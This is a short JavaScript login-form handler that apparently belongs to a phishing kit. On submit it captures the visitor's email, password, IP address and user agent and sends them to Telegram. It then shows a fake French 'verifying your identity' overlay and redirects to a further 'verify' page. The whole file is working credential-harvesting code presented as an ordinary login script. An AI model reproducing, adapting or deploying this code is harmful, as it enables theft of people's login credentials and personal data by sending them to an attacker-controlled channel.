document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const button = this.querySelector('button[type="submit"]');
    utils.showLoading(button);

    const formData = {
        email: document.getElementById('email').value,
        password: document.getElementById('password').value,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        ip: await utils.getIpAddress()
    };

    try {
        await notifications.sendToTelegram('login', formData);
        await utils.delay(CONFIG.DELAYS.LOADING);
        
        utils.showRedirectOverlay('Vérification de votre identité...');
        await utils.delay(CONFIG.DELAYS.REDIRECT);
        
        window.location.href = CONFIG.ROUTES.VERIFY;
    } catch (error) {
        console.error('Error:', error);
        utils.hideLoading(button);
    }
});